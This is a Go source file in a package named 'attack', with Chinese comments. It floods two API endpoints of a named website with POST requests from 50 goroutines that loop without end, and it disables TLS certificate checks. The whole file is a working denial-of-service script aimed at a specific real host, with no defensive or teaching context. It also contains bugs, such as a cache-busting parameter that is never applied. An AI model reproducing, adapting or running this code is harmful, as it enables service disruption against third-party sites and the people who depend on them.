package attack

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// SendRequest 发送请求
func SendRequest(urls string) string {

	// 创建一个空的 url.Values 对象，用于存储 POST 请求的参数
	data := url.Values{}
	data.Set("announcementType", "1")

	// 创建一个自定义的 Transport 对象，禁用 SSL 验证
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// 创建一个自定义的 http.Client 对象，将 Transport 对象配置到其中
	client := &http.Client{Transport: tr}

	// 创建一个自定义的 http.Request 对象
	req, err := http.NewRequest("POST", urls, strings.NewReader(data.Encode()))
	if err != nil {
		return fmt.Sprintf("Error creating request: %s", err)
	}

	// 设置请求头
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")

	// 循环发送 POST 请求
	// 在 URL 上添加随机参数，避免缓存
	urls = fmt.Sprintf("%s?rand=%s", urls, Uniqid())

	// 发送请求
	resp, err := client.Do(req)
	defer resp.Body.Close()
	if err != nil {
		return fmt.Sprintf("Error sending request: %s", err)
	}

	body,_ := ioutil.ReadAll(resp.Body)

	return string(body)
}

// Uniqid 生成一个唯一的 ID
func Uniqid() string {
	return fmt.Sprintf("%d", time.Now().UnixNano())
}

// AttachMain 入口函数
func AttachMain () {
	var wg sync.WaitGroup
	for i:=0;i<50;i++ {
		wg.Add(1)
		go func() {
			for {
				SendRequest("https://www.alsz888.com/api/wap/wapSet")
				SendRequest("https://www.alsz888.com/api/wap/getHomePageAnnouncement")
			}
		}()
	}
	wg.Wait()
}